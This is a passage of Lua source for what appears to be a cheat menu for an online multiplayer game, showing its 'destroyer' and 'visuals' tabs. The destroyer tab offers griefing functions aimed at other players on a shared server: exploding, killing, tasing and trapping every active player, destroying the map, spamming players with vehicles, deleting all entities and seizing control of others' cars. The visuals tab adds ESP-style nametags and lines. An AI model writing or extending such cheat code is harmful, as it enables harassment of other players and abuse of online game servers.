               sum.f.checkbox('sucker-fastasfuck', 'Boost Vehicle', 0.51, y) 
           end y = y + add
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('sucker-fuckveh', 'Insane Boost', 0.51, y) 
           end y = y + add
   
           if y >= 0.385 and y <= max then 
               sum.f.separator('Particle', 0.51, y) 
           end y = y + add
   
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Turn Player In To: ', {"Fire", "Flower", "Explosion", "Clown"} , 0.51, y, sum.combo[24], function(currentIndex)
                   sum.combo[24] = currentIndex
                   if sum.combo[24] == 1 then 
                       sum.playerparticles = {'core', 'ent_sht_petrol_fire'}
                   elseif sum.combo[24] == 2 then 
                       sum.playerparticles = {'scr_rcbarry2', 'scr_clown_bul'}
                   elseif sum.combo[24] == 3 then 
                       sum.playerparticles = {'core', 'exp_grd_petrol_pump'}
                   elseif sum.playerparticles[24] == 4 then 
                       sum.playerparticles = {'scr_rcbarry2', 'scr_clown_appears'}
                   end
               end) then
                   
               end
           end  y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('particle-selected', 'Particle On Him', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               if sum.f.button('Scale:', 0.51, y) then 
               end
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['muz-scale'], 0.51, y, 1) 
           end y = y + add 
       end
   
       
   
       if sum.f.tab == 'destroyer' then 
           local y = 0.387+sum.st['destroyer'].static
           local add = 0.0155
           local max = 0.65+dH/1.06
   
           if sum.f.IsDisabledControlPressed(0, 14) and y > (0.387 - (16 * add)) and sum.f.mouse((dW/2)+0.439+drag_X-dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['destroyer'].static = sum.st['destroyer'].static - add
           end
           if sum.f.IsDisabledControlJustPressed(0, 15) and y ~= 0.387 and sum.f.mouse((dW/2)+0.439+drag_X-dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['destroyer'].static = sum.st['destroyer'].static + add
           end
   
           if y >= 0.385 and y <= max then 
               sum.f.separator('Props', 0.3875, y) 
           end y = y + add
       
           if y >= 0.385 and y <= max then 
               if sum.f.button('Destroy Map', 0.3875, y) then 
                   sum.f.sendNotification('Destroying map', 'Destroyer')
                   sum.f.fuckupmap(sum.f.GetHashKey("hw1_lod_08_09_16_17_18"))
                   sum.f.fuckupmap(sum.f.GetHashKey("cs4_lod_01_slod3"))
                   sum.f.fuckupmap(sum.f.GetHashKey("dt1_21_slod"))
                   sum.f.fuckupmap(sum.f.GetHashKey("dt1_11_dt1_tower_lod"))
                   sum.f.fuckupmap(sum.f.GetHashKey("id2_lod_00_ab_slod2"))
                   sum.f.fuckupmap(sum.f.GetHashKey("dt1_lod_03_04_05_11"))
               end
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               if sum.f.button('INSANE Destroy Map (can crash game)', 0.3875, y) then 
                   sum.f.sendNotification('Destroying map', 'Destroyer')
                   sum.f.fuckupmap(sum.f.GetHashKey("hw1_lod_08_09_16_17_18"))
                   sum.f.fuckupmap(sum.f.GetHashKey("cs4_lod_01_slod3"))
                   sum.f.fuckupmap(sum.f.GetHashKey("dt1_21_slod"))
                   sum.f.fuckupmap(sum.f.GetHashKey("dt1_11_dt1_tower_lod"))
                   sum.f.fuckupmap(sum.f.GetHashKey("id2_lod_00_ab_slod2"))
                   sum.f.fuckupmap(sum.f.GetHashKey("dt1_lod_03_04_05_11"))
                   sum.f.CarInMaze('hw1_lod_08_09_16_17_18')
                   sum.f.CarInMaze('cs4_lod_01_slod3')
                   sum.f.CarInMaze('dt1_21_slod')
                   sum.f.CarInMaze('dt1_11_dt1_tower_lod')
                   sum.f.CarInMaze('id2_lod_00_ab_slod2')
                   sum.f.CarInMaze('dt1_lod_03_04_05_11')  		
                   sum.f.PlayerToSilo('hw1_lod_08_09_16_17_18')
                   sum.f.PlayerToSilo('cs4_lod_01_slod3')
                   sum.f.PlayerToSilo('dt1_21_slod')
                   sum.f.PlayerToSilo('dt1_11_dt1_tower_lod')
                   sum.f.PlayerToSilo('id2_lod_00_ab_slod2')
                   sum.f.PlayerToSilo('dt1_lod_03_04_05_11')
                   sum.f.PropsInToSHIT('hw1_lod_08_09_16_17_18')
                   sum.f.PropsInToSHIT('cs4_lod_01_slod3')
                   sum.f.PropsInToSHIT('dt1_21_slod')
                   sum.f.PropsInToSHIT('dt1_11_dt1_tower_lod')
                   sum.f.PropsInToSHIT('id2_lod_00_ab_slod2')
                   sum.f.PropsInToSHIT('dt1_lod_03_04_05_11')
               end
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               if sum.f.button('Destroy Players', 0.3875, y) then 
                   sum.f.sendNotification('Destroying Players', 'Destroyer')
                   sum.f.DestroyPlayers()
               end
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               if sum.f.button('Stuck Players', 0.3875, y) then 
                   sum.f.sendNotification('Stucked Players', 'Destroyer')
                   sum.f.TrapPlayers()
               end
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Turn Cars In To', {"Maze-Bank","Yacht","Plane","Silo", "Bush", "Logs", "X-Mas Tree", "Oak Tree", "JetSki", "Stunt Tube", "Apartman", "Rock", "Destroy Map"} , 0.3875, y, sum.combo[2], function(currentIndex)
                   sum.combo[2] = currentIndex
               end) then
                   if sum.combo[2] == 1 then 
                    sum.f.CarInMaze('dt1_11_dt1_tower_lod')
                   elseif sum.combo[2] == 2 then 
                    sum.f.CarInMaze('apa_mp_apa_yacht')
                   elseif sum.combo[2] == 3 then 
                     sum.f.CarInMaze('apa_mp_apa_crashed_usaf_01a')
                   elseif sum.combo[2] == 4 then   
                     sum.f.CarInMaze('ce_xr_ctr2')
                   elseif sum.combo[2] == 5 then   
                       sum.f.CarInMaze('prop_bush_lrg_01e_cr')
                   elseif sum.combo[2] == 6 then   
                       sum.f.CarInMaze('prop_logpile_02')
                   elseif sum.combo[2] == 7 then   
                       sum.f.CarInMaze('prop_xmas_ext')
                   elseif sum.combo[2] == 8 then   
                       sum.f.CarInMaze('prop_tree_olive_cr2')
                   elseif sum.combo[2] == 9 then   
                       sum.f.CarInMaze('prop_jetski_trailer_01')
                   elseif sum.combo[2] == 10 then   
                       sum.f.CarInMaze('bkr_prop_biker_tube_l')
                   elseif sum.combo[2] == 11 then   
                       sum.f.CarInMaze('db_apart_01_')
                   elseif sum.combo[2] == 12 then   
                       sum.f.CarInMaze('csx_seabed_rock7_')
                   elseif sum.combo[2] == 13 then   
                       sum.f.CarInMaze('hw1_lod_08_09_16_17_18')
                       sum.f.CarInMaze('cs4_lod_01_slod3')
                       sum.f.CarInMaze('dt1_21_slod')
                       sum.f.CarInMaze('dt1_11_dt1_tower_lod')
                       sum.f.CarInMaze('id2_lod_00_ab_slod2')
                       sum.f.CarInMaze('dt1_lod_03_04_05_11')                
                   end
               end
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Turn Peds In To', {"Silo","Yacht","Maze-Bank","Plane", "Bush", "Logs", "X-Mas Tree", "Oak Tree", "JetSki", "Stunt Tube", "Apartman", "Rock", "Destroy Map"} , 0.3875, y, sum.combo[1], function(currentIndex)
                   sum.combo[1] = currentIndex
               end) then
                   if sum.combo[1] == 1 then 
                    sum.f.PlayerToSilo('ce_xr_ctr2')
                   elseif sum.combo[1] == 2 then 
                    sum.f.PlayerToSilo('apa_mp_apa_yacht')
                   elseif sum.combo[1] == 3 then 
                     sum.f.PlayerToSilo('dt1_11_dt1_tower_lod')
                   elseif sum.combo[1] == 4 then   
                     sum.f.PlayerToSilo('apa_mp_apa_crashed_usaf_01a')
                   elseif sum.combo[1] == 5 then   
                       sum.f.PlayerToSilo('prop_bush_lrg_01e_cr')
                   elseif sum.combo[1] == 6 then   
                       sum.f.PlayerToSilo('prop_logpile_02')
                   elseif sum.combo[1] == 7 then   
                       sum.f.PlayerToSilo('prop_xmas_ext')
                   elseif sum.combo[1] == 8 then   
                       sum.f.PlayerToSilo('prop_tree_olive_cr2')
                   elseif sum.combo[1] == 9 then   
                       sum.f.PlayerToSilo('prop_jetski_trailer_01')
                   elseif sum.combo[1] == 10 then   
                       sum.f.PlayerToSilo('bkr_prop_biker_tube_l')
                   elseif sum.combo[1] == 11 then   
                       sum.f.PlayerToSilo('db_apart_01_')
                   elseif sum.combo[1] == 12 then   
                       sum.f.PlayerToSilo('csx_seabed_rock7_')
                   elseif sum.combo[1] == 13 then   
                       sum.f.PlayerToSilo('hw1_lod_08_09_16_17_18')
                       sum.f.PlayerToSilo('cs4_lod_01_slod3')
                       sum.f.PlayerToSilo('dt1_21_slod')
                       sum.f.PlayerToSilo('dt1_11_dt1_tower_lod')
                       sum.f.PlayerToSilo('id2_lod_00_ab_slod2')
                       sum.f.PlayerToSilo('dt1_lod_03_04_05_11')
                   end
               end
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               sum.f.separator('Grief', 0.3875, y) 
           end y = y + add
   
           if y >= 0.385 and y <= max then 
               if sum.f.button('Explode Playes', 0.3875, y) then 
                   sum.f.sendNotification('Exploding players', 'Destroyer')
                   for k, v in pairs(sum.f.GetActivePlayers()) do 
                       local position = sum.f.GetEntityCoords(sum.f.GetPlayerPed(v))
                       sum.f.AddExplosion(position, sum.s['explode-all-button'].value, 100.0, true, false, 1.0)
                   end
               end
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['explode-all-button'], 0.3875, y) 
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('explode-allbitches-loop', 'Explode Players', 0.3875, y) 
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['explode-all-loop'], 0.3875, y) 
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('kill-all', 'Kill Players', 0.3875, y) 
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('taze-all', 'Taze Players', 0.3875, y) 
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('disable-weapons', 'Disable Weapons', 0.3875, y) 
           end y = y + add  
           
           if y >= 0.385 and y <= max then 
               sum.f.separator('Vehicles', 0.3875, y) 
           end y = y + add
   
           if y >= 0.385 and y <= max then 
               if sum.f.button('Destroy Vehicles', 0.3875, y) then 
                   sum.f.sendNotification('Destroying vehicles', 'Destroyer')
                   sum.f.DestroyCars()
               end
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               if sum.f.button('Explode Vehicles', 0.3875, y) then 
                   sum.f.sendNotification('Exploding vehicles', 'Destroyer')
               for veh in sum.f.enumerateVehicles() do
                   local position = sum.f.GetEntityCoords(veh)
                   sum.f.AddExplosion(position, 7, 100.0, true, false, 1.0)
               end
           end
       end y = y + add  
   
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Tunning', {"Max", "Performance", "FiveSense Plate", "Color"} , 0.3875, y, sum.combo[14], function(currentIndex)
                   sum.combo[14] = currentIndex
               end) then
                   if sum.combo[14] == 1 then 
                       sum.f.maxoutnpc()                    
                   elseif sum.combo[14] == 2 then 
                       sum.f.maxperfonpc()                    
                   elseif sum.combo[14] == 3 then 
                       sum.f.npcplate()
                   elseif sum.combo[14] == 4 then
                       if sum.f.pickerbutton(sum.s['npcvehicle-color-r'].value, sum.s['npcvehicle-color-g'].value, sum.s['npcvehicle-color-b'].value, 0.3875, y) then 
                           sum.s['npcvehicle-color-r'].value, sum.s['npcvehicle-color-g'].value, sum.s['npcvehicle-color-b'].value = sum.f.ColorPicker(sum.s['npcvehicle-color-r'].value, sum.s['npcvehicle-color-g'].value, sum.s['npcvehicle-color-b'].value)
                       end  
                       sum.f.colorcarnpc()
                   end
               end
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Vehicle Tricks', {"Kick Flip", "Back Flip", "Jump"} , 0.3875, y, sum.combo[19], function(currentIndex)
                   sum.combo[19] = currentIndex
               end) then
                   if sum.combo[19] == 1 then 
                       for veh in sum.f.enumerateVehicles() do
                           sum.f.requestControlOnce(veh)
                           sum.f.ApplyForceToEntity(veh, 1, 0.0, 0.0, 10.0, 90.0, 0.0, 0.0, 0, 0, 1, 1, 0, 1)
                       end
                   elseif sum.combo[19] == 2 then 
                       for veh in sum.f.enumerateVehicles() do
                           sum.f.requestControlOnce(veh)
                           sum.f.ApplyForceToEntity(veh, 1, 0.0, 0.0, 15.0, 0.0, 60.0, 0.0, 0, 0, 1, 1, 0, 0)
                       end
                   elseif sum.combo[19] == 3 then 
                       for veh in sum.f.enumerateVehicles() do
                           sum.f.requestControlOnce(veh)
                           sum.f.ApplyForceToEntity(veh, 1, 0.0, 0.0, 15.0, 0.0, 0.0, 00.0, 0, 1, 0, 1, 0, 0)
                       end
                   end
               end
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               if sum.f.button('Neons Color', 0.3875, y) then
                   for veh in sum.f.enumerateVehicles() do
                       sum.f.requestControlOnce(veh) 
                       sum.f.SetNeonsOnVehNPC()
                       sum.f.SetVehicleNeonLightsColour(veh, sum.s['neonnpc-color-r'].value, sum.s['neonnpc-color-g'].value, sum.s['neonnpc-color-b'].value)
                   end
               end
               if sum.f.pickerbutton(sum.s['neonnpc-color-r'].value, sum.s['neonnpc-color-g'].value, sum.s['neonnpc-color-b'].value, 0.3875, y) then 
                   sum.s['neonnpc-color-r'].value, sum.s['neonnpc-color-g'].value, sum.s['neonnpc-color-b'].value = sum.f.ColorPicker(sum.s['neonnpc-color-r'].value, sum.s['neonnpc-color-g'].value, sum.s['neonnpc-color-b'].value)
               end 
           end y = y + add 
   
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Xenon Color', {"Default", "White", "Blue", "Electric Blue", "Mint Green", "Lime Green", "Yellow", "Golder Shower", "Orange", "Red", "Pony Pink", "Hot Pink", "Purple", "Blacklight"} , 0.3875, y, sum.combo[20], function(currentIndex)
                   sum.combo[20] = currentIndex
               end) then
                   if sum.combo[20] == 1 then
                       for veh in sum.f.enumerateVehicles() do
                           sum.f.requestControlOnce(veh) 
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, -1)
                       end
                   elseif sum.combo[20] == 2 then 
                       for veh in sum.f.enumerateVehicles() do
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 0)
                       end
                   elseif sum.combo[20] == 3 then 
                       for veh in sum.f.enumerateVehicles() do
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 1)
                       end
                   elseif sum.combo[20] == 4 then 
                       for veh in sum.f.enumerateVehicles() do
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 2)
                       end
                   elseif sum.combo[20] == 5 then 
                       for veh in sum.f.enumerateVehicles() do
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 3)
                       end
                   elseif sum.combo[20] == 6 then 
                       for veh in sum.f.enumerateVehicles() do
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 4)
                       end
                   elseif sum.combo[20] == 7 then 
                       for veh in sum.f.enumerateVehicles() do
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 5)
                       end
                   elseif sum.combo[20] == 8 then 
                       for veh in sum.f.enumerateVehicles() do
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 6)
                       end
                   elseif sum.combo[20] == 9 then 
                       for veh in sum.f.enumerateVehicles() do
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 7)
                       end
                   elseif sum.combo[20] == 10 then 
                       for veh in sum.f.enumerateVehicles() do
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 8)
                       end
                   elseif sum.combo[20] == 11 then 
                       for veh in sum.f.enumerateVehicles() do
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 9)
                       end
                   elseif sum.combo[20] == 12 then 
                       for veh in sum.f.enumerateVehicles() do
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 10)
                       end
                   elseif sum.combo[20] == 13 then 
                       for veh in sum.f.enumerateVehicles() do
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 11)
                       end
                   elseif sum.combo[20] == 14 then 
                       for veh in sum.f.enumerateVehicles() do
                           sum.f.ToggleVehicleMod(veh, 22, true)
                           sum.f.SetVehicleXenonLightsColor(veh, 12)
                       end
                   end
               end
           end y = y + add
   
           if y >= 0.385 and y <= max then 
               if sum.f.button('Extra Handling Attachment', 0.3875, y) then 
                   for ped in sum.f.enumeratePeds() do
                       local vehicle = sum.f.GetVehiclePedIsUsing(ped)
                       sum.f.requestControlOnce(vehicle)
                       sum.f.SetVehicleGravityAmount(sum.f.GetVehiclePedIsIn(ped, 0), sum.s['extra-handling-attachment-npc'].value)
                   end
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['extra-handling-attachment-npc'], 0.3875, y, 1) 
           end y = y + add  
   
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('car-riptire', 'Vehicle POP Tires', 0.3875, y) 
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('cars-animplate', 'Vehicle Animated Plate', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('car-launch', 'Launch Vehicles', 0.3875, y) 
           end y = y + add
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('car-slam', 'Slam Vehicles', 0.3875, y) 
           end y = y + add
   
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('car-stick', 'Stick Vehicles', 0.3875, y) 
           end y = y + add
           
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('car-fastasfuck', 'Boost Vehicles', 0.3875, y) 
           end y = y + add
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('car-spam', 'Spam Players with Vehicles', 0.3875, y) 
           end y = y + add
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('sucker-bringveh', 'Insane Boost', 0.3875, y) 
           end y = y + add        
           
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('cars-nogravity', 'No Gravity', 0.3875, y) 
           end y = y + add    
   
           local y = 0.387+sum.st['destroyer'].static2
   
           if sum.f.IsDisabledControlPressed(0, 14) and y > (0.387 - (5 * add)) and sum.f.mouse((dW/2)+0.561+drag_X+dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['destroyer'].static2 = sum.st['destroyer'].static2 - add
           end
           if sum.f.IsDisabledControlJustPressed(0, 15) and y ~= 0.387 and sum.f.mouse((dW/2)+0.561+drag_X+dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['destroyer'].static2 = sum.st['destroyer'].static2 + add
           end
   
           if y >= 0.385 and y <= max then 
               sum.f.separator('Friendly', 0.51, y) 
           end
           y = y + add 
           if y >= 0.385 and y <= max then 
                if sum.f.button('Forcefield', 0.51, y) then
                   sum.f.onlineplayerforcefield()
               end
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('onlineplayer-shockwavegun', 'Shockwave Gun', 0.51, y) 
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('onlineplayer-explodegun', 'Explode Gun', 0.51, y) 
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('onlineplayer-pedgun', 'Ped Gun', 0.51, y) 
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('onlineplayer-propgun', 'Prop Gun', 0.51, y) 
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('onlineplayer-ramgun', 'Ram Gun', 0.51, y) 
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('onlineplayer-vehiclegun', 'Vehicle Gun', 0.51, y) 
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('onlineplayer-particlegun', 'Particle Gun', 0.51, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.separator('Peds', 0.51, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('slam-peds', 'Slam Peds', 0.51, y) 
           end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Launch Peds', 0.51, y) then
               sum.f.launchpeds()
           end
       end 
           y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.button('Explode Peds', 0.51, y) then
               sum.f.pedsexplode()
           end
       end  y = y + add 
       if y >= 0.385 and y <= max then 
           sum.f.separator('Deleter', 0.51, y) 
       end y = y + add
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Delete', {"All", "Vehicles", "Objects", "Peds"} , 0.51, y, sum.combo[11], function(currentIndex)
                   sum.combo[11] = currentIndex
               end) then
                   if sum.combo[11] == 1 then 
                       sum.f.deleteall()
                   elseif sum.combo[11] == 2 then 
                       sum.f.deletevehicles()
                   elseif sum.combo[11] == 3 then 
                       sum.f.deleteobjects()
                   elseif sum.combo[11] == 4 then   
                       sum.f.deletepeds()
                   end
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.separator('Particles', 0.51, y) 
           end
           y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Turn Peds In To: ', {"Fire", "Flower", "Explosion", "Clown"} , 0.51, y, sum.combo[22], function(currentIndex)
                   sum.combo[22] = currentIndex
                   if sum.combo[22] == 1 then 
                       sum.destroyerparticles = {'core', 'ent_sht_petrol_fire'}
                   elseif sum.combo[22] == 2 then 
                       sum.destroyerparticles = {'scr_rcbarry2', 'scr_clown_bul'}
                   elseif sum.combo[22] == 3 then 
                       sum.destroyerparticles = {'core', 'exp_grd_petrol_pump'}
                   elseif sum.combo[22] == 4 then 
                       sum.destroyerparticles = {'scr_rcbarry2', 'scr_clown_appears'}
                   end
               end) then
                   
               end
           end  y = y + add 
           if y >= 0.385 and y <= max then 
               if sum.f.combo('Turn Cars In To: ', {"Fire", "Flower", "Explosion", "Clown"} , 0.51, y, sum.combo[23], function(currentIndex)
                   sum.combo[23] = currentIndex
                   if sum.combo[23] == 1 then 
                       sum.destroyerparticles = {'core', 'ent_sht_petrol_fire'}
                   elseif sum.combo[23] == 2 then 
                       sum.destroyerparticles = {'scr_rcbarry2', 'scr_clown_bul'}
                   elseif sum.combo[23] == 3 then 
                       sum.destroyerparticles = {'core', 'exp_grd_petrol_pump'}
                   elseif sum.combo[23] == 4 then 
                       sum.destroyerparticles = {'scr_rcbarry2', 'scr_clown_appears'}
                   end
               end) then
                   
               end
           end  y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('particles-on-peds', 'Particles On Peds', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('particles-on-cars', 'Particle On Cars', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               if sum.f.button('Scale:', 0.51, y) then 
               end
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['destroyer-particles'], 0.51, y, 1) 
           end y = y + add
       end
   
       
   
       
   
       if sum.f.tab == 'visuals' then 
           local y = 0.387+sum.st['visuals'].static2
           local add = 0.0155
           local max = 0.65+dH/1.06
           
           if sum.f.IsDisabledControlPressed(0, 14) and y > (0.387 - (0 * add)) and sum.f.mouse((dW/2)+0.439+drag_X-dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['visuals'].static2 = sum.st['visuals'].static2 - add
           end
           if sum.f.IsDisabledControlJustPressed(0, 15) and y ~= 0.387 and sum.f.mouse((dW/2)+0.439+drag_X-dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['visuals'].static2 = sum.st['visuals'].static2 + add
           end
   
           if y >= 0.385 and y <= max then 
               sum.f.separator('Visuals', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-third-person', 'Third Person', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-radar', 'Display Radar', 0.3875, y) 
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               sum.f.separator('World', 0.3875, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-fullbright', 'Full Bright', 0.3875, y) 
           end y = y + add  
   
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-worldcolor', 'Ambient light', 0.3875, y) 
               if sum.f.pickerbutton(sum.s['visuals-world-r'].value, sum.s['visuals-world-g'].value, sum.s['visuals-world-b'].value, 0.3875, y) then 
                   sum.s['visuals-world-r'].value, sum.s['visuals-world-g'].value, sum.s['visuals-world-b'].value = sum.f.ColorPicker(sum.s['visuals-world-r'].value, sum.s['visuals-world-g'].value, sum.s['visuals-world-b'].value)
               end
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-showcoords', 'Display Coords', 0.3875, y) 
           end y = y + add 
   
           if y >= 0.385 and y <= max then 
               sum.f.separator('Crosshair', 0.3875, y) 
           end y = y + add
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('crosshair', 'Crosshair', 0.3875, y) 
               if sum.f.pickerbutton(sum.s['crosshair-r'].value, sum.s['crosshair-g'].value, sum.s['crosshair-b'].value, 0.3875, y) then 
                   sum.s['crosshair-r'].value, sum.s['crosshair-g'].value, sum.s['crosshair-b'].value = sum.f.ColorPicker(sum.s['crosshair-r'].value, sum.s['crosshair-g'].value, sum.s['crosshair-b'].value)
               end
           end y = y + add  
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('crosshair-outline', 'Outline', 0.3875, y) 
           end y = y + add 
   
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('crosshair-dot', 'Dot', 0.3875, y) 
           end y = y + add 
   
           if y >= 0.385 and y <= max then 
               sum.f.button('Thickness', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['crosshair-thickness'], 0.3875, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.button('Gap', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['crosshair-gap'], 0.3875, y) 
           end y = y + add 
           if y >= 0.385 and y <= max then 
               sum.f.button('Size', 0.3875, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['crosshair-size'], 0.3875, y) 
           end y = y + add 
   
           local y = 0.387+sum.st['visuals'].static
   
   
           if sum.f.IsDisabledControlPressed(0, 14) and y > (0.387 - (45 * add)) and sum.f.mouse((dW/2)+0.561+drag_X+dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['visuals'].static = sum.st['visuals'].static - add
           end
           if sum.f.IsDisabledControlJustPressed(0, 15) and y ~= 0.387 and sum.f.mouse((dW/2)+0.561+drag_X+dW/4, 0.51+drag_Y+dH/2, dW+0.121-dW/2, 0.2658+dH) then
               sum.st['visuals'].static = sum.st['visuals'].static + add
           end
           if y >= 0.385 and y <= max then 
               sum.f.separator('Distance Settings', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.button('Max Distance', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.slider(sum.s['visuals-distance'], 0.51, y) 
           end y = y + add 
   
           if y >= 0.385 and y <= max then 
               sum.f.separator('General Options', 0.51, y) 
           end y = y + add
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-blips', 'Blips', 0.51, y) 
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-nametags', 'Nametags', 0.51, y) 
               if sum.f.pickerbutton(sum.s['visuals-nametags-r'].value, sum.s['visuals-nametags-g'].value, sum.s['visuals-nametags-b'].value, 0.51, y) then 
                   sum.s['visuals-nametags-r'].value, sum.s['visuals-nametags-g'].value, sum.s['visuals-nametags-b'].value = sum.f.ColorPicker(sum.s['visuals-nametags-r'].value, sum.s['visuals-nametags-g'].value, sum.s['visuals-nametags-b'].value)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-holdingweapons', 'Holding Weapon', 0.51, y) 
               if sum.f.pickerbutton(sum.s['visuals-holdingweapons-r'].value, sum.s['visuals-holdingweapons-g'].value, sum.s['visuals-holdingweapons-b'].value, 0.51, y) then 
                   sum.s['visuals-holdingweapons-r'].value, sum.s['visuals-holdingweapons-g'].value, sum.s['visuals-holdingweapons-b'].value = sum.f.ColorPicker(sum.s['visuals-holdingweapons-r'].value, sum.s['visuals-holdingweapons-g'].value, sum.s['visuals-holdingweapons-b'].value)
               end
           end y = y + add  
           if y >= 0.385 and y <= max then 
               sum.f.checkbox('visuals-lines', 'Lines', 0.51, y) 
               if sum.f.pickerbutton(sum.s['visuals-lines-r'].value, sum.s['visuals-lines-g'].value, sum.s['visuals-lines-b'].value, 0.51, y) then 
